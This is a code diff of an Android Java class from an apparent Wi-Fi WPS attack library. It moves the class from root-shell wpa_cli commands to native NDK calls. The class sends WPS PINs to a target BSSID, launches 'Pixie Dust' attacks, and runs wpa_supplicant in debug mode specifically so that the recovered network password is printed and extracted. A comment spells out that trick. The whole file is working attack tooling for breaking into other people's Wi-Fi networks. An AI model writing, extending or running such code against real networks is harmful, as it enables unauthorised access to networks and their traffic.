@@ -1,22 +1,22 @@
 package sangiorgi.wps.lib.services;
 
-import android.os.Build;
+import android.content.Context;
+import android.os.SystemClock;
 import android.util.Log;
-import com.topjohnwu.superuser.Shell;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Locale;
 import java.util.concurrent.CompletableFuture;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
-import sangiorgi.wps.lib.WpsLibConfig;
 import sangiorgi.wps.lib.commands.*;
+import sangiorgi.wps.lib.ndk.WpsConfig;
+import sangiorgi.wps.lib.ndk.WpsNative;
 
 /**
- * WPS command executor using Command pattern. Provides async operations, error handling, and
+ * WPS command executor using NDK-based native code. Provides async operations, error handling, and
  * supports both standard WPS and Pixie Dust attacks.
  */
 public class WpsExecutor implements AutoCloseable {
@@ -25,13 +25,16 @@ public class WpsExecutor implements AutoCloseable {
   private static final int DEFAULT_TIMEOUT_SECONDS = 30;
   private static final int PIXIE_DUST_TIMEOUT_SECONDS = 120;
 
-  private final WpsLibConfig libConfig;
   private final ExecutorService executorService;
   private final CountDownLatch environmentReady = new CountDownLatch(1);
   private volatile boolean isCleanedUp = false;
 
-  public WpsExecutor(WpsLibConfig libConfig) {
-    this.libConfig = libConfig;
+  private final Context context;
+  private final WpsNative wpsNative;
+
+  public WpsExecutor(Context context) {
+    this.context = context.getApplicationContext();
+    this.wpsNative = new WpsNative(this.context);
     // Use a fixed thread pool bounded by CPU cores to prevent OOM from unbounded thread creation
     int coreCount = Runtime.getRuntime().availableProcessors();
     this.executorService = Executors.newFixedThreadPool(Math.max(2, coreCount));
@@ -39,36 +42,22 @@ public class WpsExecutor implements AutoCloseable {
   }
 
   private void initializeEnvironment() {
-    setupWpsEnvironment();
-  }
-
-  private void setupWpsEnvironment() {
-    String filesDir = libConfig.getFilesDir();
-    String dataDir = libConfig.getDataDir();
-    executorService.execute(
-        () -> {
-          try {
-            Shell.Result result =
-                Shell.cmd(
-                        "chmod 755 " + filesDir + "/*",
-                        "mkdir -p " + dataDir + "Sessions",
-                        "chmod 755 " + dataDir + "Sessions")
-                    .exec();
-
-            if (!result.isSuccess()) {
-              Log.e(TAG, "Failed to setup WPS environment: " + String.join("\n", result.getErr()));
-            }
-          } catch (Exception e) {
-            Log.e(TAG, "Error setting up WPS environment", e);
-          } finally {
-            environmentReady.countDown();
-          }
-        });
+    // With NDK, environment setup is minimal - native library loads in WpsNative constructor
+    executorService.execute(() -> {
+      try {
+        if (!wpsNative.isAvailable()) {
+          Log.e(TAG, "Native library not available");
+        } else {
+          Log.i(TAG, "NDK environment ready");
+        }
+      } finally {
+        environmentReady.countDown();
+      }
+    });
   }
 
   /**
    * Wait for the environment setup to complete.
-   * Call this before executing any WPS operations to avoid race conditions.
    *
    * @param timeout Maximum time to wait
    * @param unit Time unit
@@ -78,162 +67,128 @@ public class WpsExecutor implements AutoCloseable {
     return environmentReady.await(timeout, unit);
   }
 
-  /** Check if the environment setup has completed. */
-  public boolean isReady() {
-    return environmentReady.getCount() == 0;
+  /** Get the WpsNative instance for direct native operations. */
+  public WpsNative getWpsNative() {
+    return wpsNative;
   }
 
   /**
-   * Execute WPS connection with automatic method selection
+   * Execute WPS connection using NDK native code.
    *
    * @param bssid Target BSSID
    * @param pin WPS PIN
    * @return CompletableFuture with WpsResult
    */
   public CompletableFuture<WpsResult> executeWpsConnection(String bssid, String pin) {
-    return executeWpsConnection(bssid, pin, shouldUseOldMethod());
-  }
-
-  /**
-   * Execute WPS connection with specified method
-   *
-   * @param bssid Target BSSID
-   * @param pin WPS PIN
-   * @param useOldMethod Force old method (wpa_cli)
-   * @return CompletableFuture with WpsResult
-   */
-  public CompletableFuture<WpsResult> executeWpsConnection(
-      String bssid, String pin, boolean useOldMethod) {
-
     return CompletableFuture.supplyAsync(
         () -> {
           // Ensure environment is ready before executing
           try {
-            environmentReady.await(10, TimeUnit.SECONDS);
+            if (!environmentReady.await(10, TimeUnit.SECONDS)) {
+              return createErrorResult(bssid, pin, "Environment setup timed out");
+            }
           } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
             return createErrorResult(bssid, pin, "Interrupted waiting for environment setup");
           }
 
-          if (useOldMethod) {
-            CommandConfig config =
-                new CommandConfig(libConfig.getFilesDir(), true, DEFAULT_TIMEOUT_SECONDS);
-            CommandFactory factory = new CommandFactory(config);
-            return executeOldMethodSync(factory, bssid, pin);
-          } else {
-            return executeNewMethodSync(bssid, pin);
+          if (!wpsNative.isAvailable()) {
+            return createErrorResult(bssid, pin, "Native library not available");
           }
+
+          return executeNativeWps(bssid, pin);
         },
         executorService);
   }
 
-  private WpsResult executeOldMethodSync(CommandFactory factory, String bssid, String pin) {
-    List<WpsCommand> commands = factory.createOldMethodCommands(bssid, pin);
-    List<CommandResult> results = executeCommandsSync(commands);
-    return new WpsResult(bssid, pin, results);
+  private WpsResult executeNativeWps(String bssid, String pin) {
+    String confPath = WpsConfig.ensureConfigFile(context);
+    if (confPath == null) {
+      return createErrorResult(bssid, pin, "Failed to create wpa_supplicant config file");
+    }
+    String ctrlDir = WpsNative.getCtrlDir();
+
+    // Debug mode (-d) is required: the Network Key hexdump is at MSG_DEBUG level.
+    // Without -d, wpa_supplicant only outputs MSG_INFO+, so the password is never
+    // printed to stdout and cannot be extracted. -K (already set) then ensures the
+    // key material is shown instead of [REMOVED].
+    long handle = wpsNative.startWpaSupplicant("wlan0", confPath, ctrlDir, true);
+    if (handle == 0) {
+      return createErrorResult(bssid, pin, "Failed to start wpa_supplicant");
+    }
+
+    try {
+      // Wait for wpa_supplicant to initialize
+      SystemClock.sleep(2000);
+
+      // Send WPS_REG command
+      wpsNative.wpsReg(bssid, pin);
+
+      // Read WPS result with timeout
+      sangiorgi.wps.lib.ndk.WpsResult nativeResult =
+          wpsNative.readWpsResult(handle, DEFAULT_TIMEOUT_SECONDS * 1000);
+
+      // Convert native result to library WpsResult
+      return convertNativeResult(bssid, pin, nativeResult);
+
+    } finally {
+      wpsNative.stopWpaSupplicant(handle);
+    }
   }
 
-  private WpsResult executeNewMethodSync(String bssid, String pin) {
-    CommandConfig config =
-        new CommandConfig(libConfig.getFilesDir(), false, DEFAULT_TIMEOUT_SECONDS);
+  private WpsResult convertNativeResult(String bssid, String pin,
+      sangiorgi.wps.lib.ndk.WpsResult nativeResult) {
+    List<CommandResult> results = new ArrayList<>();
+    List<String> output = new ArrayList<>();
 
-    try (WpaSupplicantSession session = new WpaSupplicantSession(config, this::isWpsComplete)) {
-
-      session.start();
-      session.waitForReady();
-
-      Log.d(TAG, "wpa_supplicant initialized, executing wpa_cli commands...");
-
-      // Execute wpa_cli commands on the main shell while wpa_supplicant runs
-      session.executeWpaCliCommands(bssid, pin);
-
-      // Wait for WPS exchange to complete
-      Log.d(TAG, "Waiting for WPS exchange to complete...");
-      session.waitForCompletion(DEFAULT_TIMEOUT_SECONDS);
-
-      // Check if the session output indicates success
-      List<String> outputLines = session.getOutput();
-      boolean hasSuccessIndicator = checkForSuccessIndicators(outputLines);
-
-      // Build the supplicant result with collected output
-      // Only mark as success if we found actual WPS success indicators
-      CommandResult supplicantResult =
-          new CommandResult(
-              hasSuccessIndicator, outputLines, null, WpsCommand.CommandType.WPA_SUPPLICANT);
-
-      List<CommandResult> results = new ArrayList<>();
-      results.add(supplicantResult);
-
+    if (nativeResult == null) {
+      output.add("No response from wpa_supplicant");
+      results.add(new CommandResult(false, output, null, WpsCommand.CommandType.WPA_SUPPLICANT));
       return new WpsResult(bssid, pin, results);
-
-    } catch (InterruptedException e) {
-      Log.e(TAG, "Command interrupted", e);
-      Thread.currentThread().interrupt();
-      return createErrorResult(bssid, pin, "Command interrupted: " + e.getMessage());
-    } catch (Exception e) {
-      Log.e(TAG, "Command execution failed", e);
-      return createErrorResult(bssid, pin, "Execution failed: " + e.getMessage());
     }
+
+    boolean success = nativeResult.isSuccess();
+    String rawLine = nativeResult.getRawLine();
+    String networkKey = nativeResult.getNetworkKey();
+
+    if (rawLine != null) output.add(rawLine);
+
+    switch (nativeResult.getStatus()) {
+      case SUCCESS:
+        output.add("WPS-SUCCESS");
+        if (networkKey != null) output.add("Network Key: " + networkKey);
+        break;
+      case FOUR_FAIL:
+        output.add("WPS-FAIL msg=8 config_error=18");
+        break;
+      case THREE_FAIL:
+        output.add("WPS-FAIL msg=10 config_error=18");
+        break;
+      case LOCKED:
+        output.add("WPS-FAIL config_error=15");
+        output.add("setup locked");
+        break;
+      case TIMEOUT:
+        output.add("WPS-TIMEOUT");
+        break;
+      case SELINUX:
+        output.add("SELinux denied");
+        break;
+      default:
+        output.add("WPS-FAIL");
+        break;
+    }
+
+    results.add(new CommandResult(success, output, null, WpsCommand.CommandType.WPA_SUPPLICANT));
+    WpsResult result = new WpsResult(bssid, pin, results);
+    if (networkKey != null) {
+      result.setPassword(networkKey);
+    }
+    return result;
   }
 
   /**
-   * Check if WPS exchange is complete based on wpa_supplicant output. Detects success (connected,
-   * credentials received) or failure (NACK, timeout, fail).
-   */
-  private boolean isWpsComplete(String line) {
-    String lower = line.toLowerCase(Locale.ROOT);
-
-    // Success indicators
-    if (lower.contains("wps-success")
-        || lower.contains("wps_success")
-        || lower.contains("network key")
-        || lower.contains("ctrl-event-connected")
-        || lower.contains("key negotiation completed")) {
-      return true;
-    }
-
-    // Failure indicators (M4/M6 NACK, timeout, etc.)
-    return lower.contains("wps-fail")
-        || lower.contains("wsc_nack")
-        || lower.contains("wps_nack")
-        || lower.contains("eap failure")
-        || lower.contains("wps-timeout")
-        || lower.contains("wps_timeout")
-        || lower.contains("m2d")
-        || lower.contains("authentication failed")
-        || lower.contains("4-way handshake failed");
-  }
-
-  /**
-   * Check if the output contains WPS success indicators.
-   *
-   * @param outputLines Lines of output from wpa_supplicant
-   * @return true if success indicators are found
-   */
-  private boolean checkForSuccessIndicators(List<String> outputLines) {
-    if (outputLines == null || outputLines.isEmpty()) {
-      return false;
-    }
-
-    for (String line : outputLines) {
-      if (line == null) continue;
-      String lower = line.toLowerCase(Locale.ROOT);
-
-      // Check for specific WPS success indicators
-      if (lower.contains("wps-success")
-          || lower.contains("wps_success")
-          || lower.contains("ctrl-event-connected")
-          || lower.contains("key negotiation completed")
-          || lower.contains("network key")) {
-        Log.d(TAG, "Found success indicator in: " + line);
-        return true;
-      }
-    }
-    return false;
-  }
-
-  /**
-   * Execute Pixie Dust attack
+   * Execute Pixie Dust attack using NDK native code.
    *
    * @param bssid Target BSSID
    * @return CompletableFuture with WpsResult containing PIN and password if successful
@@ -243,13 +198,19 @@ public class WpsExecutor implements AutoCloseable {
         () -> {
           // Ensure environment is ready before executing
           try {
-            environmentReady.await(10, TimeUnit.SECONDS);
+            if (!environmentReady.await(10, TimeUnit.SECONDS)) {
+              return createErrorResult(bssid, "N/A", "Environment setup timed out");
+            }
           } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
             return createErrorResult(bssid, "N/A", "Interrupted waiting for environment setup");
           }
 
-          PixieDustExecutor pixieExecutor = new PixieDustExecutor(libConfig, this);
+          if (!wpsNative.isAvailable()) {
+            return createErrorResult(bssid, "N/A", "Native library not available");
+          }
+
+          PixieDustExecutor pixieExecutor = new PixieDustExecutor(context, this);
 
           try {
             PixieDustExecutor.PixieDustResult result =
@@ -307,27 +268,6 @@ public class WpsExecutor implements AutoCloseable {
     return wpsResult;
   }
 
-  private List<CommandResult> executeCommandsSync(List<WpsCommand> commands) {
-    List<CommandResult> results = new ArrayList<>();
-
-    for (WpsCommand command : commands) {
-      try {
-        CommandResult result = command.execute().get(DEFAULT_TIMEOUT_SECONDS, TimeUnit.SECONDS);
-        results.add(result);
-      } catch (Exception e) {
-        Log.e(TAG, "Command execution failed: " + command.getCommandType(), e);
-        results.add(
-            new CommandResult(
-                false,
-                null,
-                List.of("Execution failed: " + e.getMessage()),
-                command.getCommandType()));
-      }
-    }
-
-    return results;
-  }
-
   private WpsResult createErrorResult(String bssid, String pin, String errorMessage) {
     List<CommandResult> errorResults =
         List.of(
@@ -346,7 +286,11 @@ public class WpsExecutor implements AutoCloseable {
 
   private void killWpsProcesses() {
     try {
-      Shell.cmd("pkill -f wpa_supplicant", "pkill -f wpa_cli", "pkill -f pixiedust").exec();
+      com.topjohnwu.superuser.Shell.cmd(
+          "killall libwpa_supplicant_exec.so 2>/dev/null",
+          "killall libwpa_cli_exec.so 2>/dev/null",
+          "killall libpixiewps_exec.so 2>/dev/null"
+      ).exec();
     } catch (Exception e) {
       Log.e(TAG, "Error killing WPS processes", e);
     }
@@ -378,14 +322,5 @@ public class WpsExecutor implements AutoCloseable {
   @Override
   public void close() {
     cleanup();
-  }
-
-  /**
-   * Determine if old method should be used based on Android version
-   *
-   * @return true if Android version is below P (API 28)
-   */
-  private static boolean shouldUseOldMethod() {
-    return Build.VERSION.SDK_INT < Build.VERSION_CODES.P;
   }
 }
